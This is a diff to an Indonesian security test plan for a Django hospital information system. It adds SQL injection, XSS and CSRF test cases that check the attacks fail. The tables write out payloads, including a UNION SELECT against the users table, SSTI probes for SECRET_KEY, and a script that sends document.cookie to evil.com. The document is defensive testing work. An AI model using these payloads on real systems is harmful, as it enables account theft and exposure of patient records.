@@ -442,6 +442,7 @@ Bagian ini mengikuti format test case umum yang diberikan. Screenshot bukti peng
 | TC-SQLi-01 | Login Bypass via SQL Injection | Semua (1-10) | SQL Injection | Mencoba melewati autentikasi login dengan SQL injection klasik. | 1. Buka halaman login aplikasi.<br>2. Masukkan payload pada field username dan/atau password.<br>3. Submit form. | Username: `' OR '1'='1' --`<br>Password: bebas | Login gagal; response menampilkan pesan `Username atau password salah`; tidak ada redirect ke dashboard. | CWE-89 | Lulus | ![TC-SQLi-01](docs/screenshots/general/TC-SQLi-01.png) |
 | TC-SQLi-02 | Data Extraction via Search Input | Semua (1-10) | SQL Injection | Mencoba mengekstrak data dari tabel lain menggunakan UNION-based injection. | 1. Login sebagai user valid.<br>2. Gunakan fitur pencarian encounter di patient portal.<br>3. Masukkan payload `UNION SELECT`. | Query: `' UNION SELECT username, password, null FROM users --` | Aplikasi mengembalikan hasil pencarian normal atau pesan kosong/generik; tidak menampilkan data tabel user; tidak ada stack trace atau detail SQL error. | CWE-89 | Lulus | ![TC-SQLi-02](docs/screenshots/general/TC-SQLi-02.png) |
 | TC-SQLi-03 | Parameterized Query Verification (White-box) | Semua (1-10) | SQL Injection | Verifikasi kode menggunakan parameterized query atau ORM, bukan string concatenation. | 1. Review source code fungsi yang berinteraksi dengan database.<br>2. Cari pola berbahaya seperti `f"SELECT ... {user_input}"`, `"SELECT ..." + var`, `format()`, atau `%` formatting pada raw SQL. | Code review, tidak ada input runtime. | Tidak ditemukan raw SQL dengan string concatenation dari input user; query aplikasi menggunakan Django ORM atau parameterized query. | CWE-89 | Lulus | ![TC-SQLi-03](docs/screenshots/general/TC-SQLi-03.png) |
+| TC-SQLi-04a | Hospital: Pencarian Rekam Medis | 1 - Hospital Information System | SQL Injection | Menguji input pencarian riwayat medis/encounter pasien dengan payload SQL injection klasik. | 1. Login sebagai pasien valid.<br>2. Buka halaman medical history atau pencarian rekam medis pasien.<br>3. Masukkan payload pada input pencarian nomor rekam medis/encounter. | Nomor rekam medis: `12345' OR '1'='1` | Hanya menampilkan data pasien yang sesuai nomor tersebut; tidak dump semua rekam medis dan tidak menampilkan data pasien lain. | CWE-89 | Lulus | ![TC-SQLi-04a](docs/screenshots/general/TC-SQLi-04a.png) |
 
 ### Code Injection dan XSS
 
@@ -450,6 +451,7 @@ Bagian ini mengikuti format test case umum yang diberikan. Screenshot bukti peng
 | TC-CI-01 | Script Tag Injection (Stored XSS / Reflected XSS) | Semua (1-10) | Code Injection (XSS) | Menyisipkan script HTML berbahaya ke field input yang ditampilkan kembali. | 1. Login sebagai user valid.<br>2. Temukan field input yang hasilnya ditampilkan kembali, misalnya reason appointment atau profil pasien.<br>3. Masukkan payload XSS.<br>4. Simpan dan lihat halaman yang menampilkan data tersebut. | `<script>alert('XSS')</script>` | Script tidak dieksekusi; teks ditolak oleh validasi atau tampil sebagai literal; tidak muncul alert box. | CWE-79 | Lulus | ![TC-CI-01](docs/screenshots/general/TC-CI-01.png) |
 | TC-CI-02 | HTML Injection via Input Field | Semua (1-10) | Code Injection (HTML Injection) | Mencoba menyimpan tag HTML dan event handler berbahaya pada input user. | 1. Login sebagai user valid.<br>2. Masukkan payload HTML pada field yang ditampilkan kembali.<br>3. Submit form dan cek halaman hasil. | `<h1>Hacked</h1><img src=x onerror=alert(1)>` | Tag HTML tidak dirender sebagai HTML aktif; payload ditampilkan sebagai teks biasa atau ditolak oleh validasi form. | CWE-79 | Lulus | ![TC-CI-02](docs/screenshots/general/TC-CI-02.png) |
 | TC-CI-03 | Template Injection (untuk Django/Jinja2) | Semua (1-10) | Code Injection (SSTI) | Mencoba mengeksploitasi Server-Side Template Injection. | 1. Login sebagai user valid.<br>2. Masukkan payload template expression pada input teks.<br>3. Simpan dan lihat apakah expression dievaluasi server. | `{{7*7}}` atau `{{config.SECRET_KEY}}` | Input ditampilkan sebagai teks literal, bukan `49`; `SECRET_KEY` atau informasi server tidak bocor. | CWE-94 | Lulus | ![TC-CI-03](docs/screenshots/general/TC-CI-03.png) |
+| TC-CI-04a | Hospital: Nama Pasien / Catatan Dokter | 1 - Hospital Information System | Code Injection | Injeksi pada field nama pasien atau kolom catatan/diagnosa dokter. | 1. Login sebagai user valid.<br>2. Buka form edit profil pasien atau form catatan medis.<br>3. Masukkan payload script pencuri cookie.<br>4. Submit form dan periksa hasilnya. | `<script>document.location='http://evil.com?c='+document.cookie</script>` | Input ditolak oleh validasi atau diperlakukan sebagai teks biasa; tidak ada redirect ke domain eksternal dan tidak ada pencurian cookie. | CWE-79 | Lulus | ![TC-CI-04a](docs/screenshots/general/TC-CI-04a.png) |
 
 ### Broken Authentication
 
@@ -468,6 +470,7 @@ Bagian ini mengikuti format test case umum yang diberikan. Screenshot bukti peng
 | TC-CSRF-01 | CSRF Token Presence on Forms | Semua (1-10) | CSRF | Memastikan setiap form POST memiliki CSRF token. | 1. Login sebagai user valid.<br>2. Buka semua form yang melakukan operasi write.<br>3. Inspect source HTML form tersebut. | Inspeksi HTML. | Setiap form POST memiliki hidden input `csrfmiddlewaretoken`. | CWE-352 | Lulus | ![TC-CSRF-01](docs/screenshots/general/TC-CSRF-01.png) |
 | TC-CSRF-02 | Request dengan CSRF Token Invalid Ditolak | Semua (1-10) | CSRF | Mengirim POST request dengan CSRF token yang salah atau palsu. | 1. Login sebagai user valid.<br>2. Intercept request POST.<br>3. Ubah nilai `csrfmiddlewaretoken` menjadi `invalid_token_12345`.<br>4. Forward request. | `csrfmiddlewaretoken=invalid_token_12345` | Server merespons HTTP 403 Forbidden; operasi tidak dieksekusi. | CWE-352 | Lulus | ![TC-CSRF-02](docs/screenshots/general/TC-CSRF-02.png) |
 | TC-CSRF-03 | Simulasi Cross-Origin Request (Tanpa Token) | Semua (1-10) | CSRF | Simulasi serangan CSRF dari halaman eksternal menggunakan HTML form sederhana. | 1. Buat file HTML lokal `csrf_attack.html` dengan form POST ke endpoint target.<br>2. User yang sudah login membuka file tersebut dan submit form.<br>3. Lihat apakah server mengeksekusi request. | `<form action="http://localhost:8000/patient/appointments/new/" method="POST">` dengan field berbahaya tanpa token. | Server menolak request dengan HTTP 403; operasi tidak dieksekusi karena tidak ada CSRF token valid. | CWE-352 | Lulus | ![TC-CSRF-03](docs/screenshots/general/TC-CSRF-03.png) |
+| TC-CSRF-04a | Hospital: Form Ubah Data Pasien | 1 - Hospital Information System | CSRF | Menguji endpoint POST edit data pasien agar tidak dapat dipanggil tanpa token CSRF valid. | 1. Login sebagai pasien valid.<br>2. Kirim POST langsung ke `/patient/edit/<id>/` tanpa `csrfmiddlewaretoken` valid.<br>3. Periksa apakah data pasien berubah. | POST ubah nama/alamat pasien tanpa token CSRF. | Server menolak request dengan HTTP 403; data pasien tidak berubah dan operasi tidak dieksekusi tanpa izin. | CWE-352 | Lulus | ![TC-CSRF-04a](docs/screenshots/general/TC-CSRF-04a.png) |
 
 ## D. Daftar Screenshot Bukti Pengujian
 
@@ -476,9 +479,11 @@ Bagian ini mengikuti format test case umum yang diberikan. Screenshot bukti peng
 | TC-SQLi-01 | `docs/screenshots/general/TC-SQLi-01.png` | Login dengan payload SQL injection gagal dan pesan error tetap generik. |
 | TC-SQLi-02 | `docs/screenshots/general/TC-SQLi-02.png` | Search input dengan payload `UNION SELECT` tidak menampilkan data user atau error SQL. |
 | TC-SQLi-03 | `docs/screenshots/general/TC-SQLi-03.png` | Review kode menunjukkan penggunaan ORM/parameterized query. |
+| TC-SQLi-04a | `docs/screenshots/general/TC-SQLi-04a.png` | Payload `12345' OR '1'='1` pada pencarian riwayat medis tidak dump semua rekam medis. |
 | TC-CI-01 | `docs/screenshots/general/TC-CI-01.png` | Payload `<script>` tidak dieksekusi. |
 | TC-CI-02 | `docs/screenshots/general/TC-CI-02.png` | Payload HTML tidak dirender sebagai markup aktif. |
 | TC-CI-03 | `docs/screenshots/general/TC-CI-03.png` | Payload template tidak dievaluasi menjadi output server-side. |
+| TC-CI-04a | `docs/screenshots/general/TC-CI-04a.png` | Payload script pencuri cookie pada nama pasien/catatan dokter ditolak atau tidak dieksekusi. |
 | TC-BA-01 | `docs/screenshots/general/TC-BA-01.png` | Password tersimpan sebagai hash Django. |
 | TC-BA-02 | `docs/screenshots/general/TC-BA-02.png` | Akun terkunci sementara setelah percobaan login gagal berulang. |
 | TC-BA-03 | `docs/screenshots/general/TC-BA-03.png` | Cookie session lama tidak dapat mengakses halaman protected setelah logout. |
@@ -487,6 +492,7 @@ Bagian ini mengikuti format test case umum yang diberikan. Screenshot bukti peng
 | TC-CSRF-01 | `docs/screenshots/general/TC-CSRF-01.png` | Form POST memiliki hidden input `csrfmiddlewaretoken`. |
 | TC-CSRF-02 | `docs/screenshots/general/TC-CSRF-02.png` | Token CSRF invalid menghasilkan HTTP 403. |
 | TC-CSRF-03 | `docs/screenshots/general/TC-CSRF-03.png` | Cross-origin POST tanpa token valid menghasilkan HTTP 403. |
+| TC-CSRF-04a | `docs/screenshots/general/TC-CSRF-04a.png` | POST edit data pasien tanpa token valid menghasilkan HTTP 403 dan data tidak berubah. |
 
 ## E. Catatan Verifikasi Lokal
 
@@ -501,9 +507,11 @@ Beberapa test yang mendukung rubrik:
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_sqli_01_login_bypass_payload_fails`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_sqli_02_union_payload_on_input_does_not_extract_data`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_sqli_03_non_billing_source_uses_orm_not_raw_sql_concat`
+- `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_sqli_04a_hospital_medical_record_search_rejects_bypass_payload`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ci_01_script_tag_input_is_rejected`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ci_02_html_injection_input_is_rejected`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ci_03_ssti_payload_is_not_executed`
+- `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ci_04a_patient_name_rejects_cookie_stealing_script_payload`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ba_01_password_is_hashed`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ba_02_account_locks_after_repeated_failed_login`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_ba_03_old_session_cookie_cannot_access_after_logout`
@@ -512,6 +520,7 @@ Beberapa test yang mendukung rubrik:
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_csrf_01_post_forms_render_csrf_token`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_csrf_02_invalid_csrf_token_is_rejected`
 - `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_csrf_03_cross_origin_post_without_token_is_rejected`
+- `auth_app.tests_general_tc.Tugas3GeneralSecurityTestCases.test_tc_csrf_04a_patient_edit_without_token_is_rejected`
 - `auth_app.tests.AuthSecurityTests.test_account_locked_after_five_failed_attempts`
 - `auth_app.tests.AuthSecurityTests.test_locked_account_cannot_login_even_with_correct_password`
 - `auth_app.tests.AuthSecurityTests.test_wrong_password_stays_on_login_page_with_message`
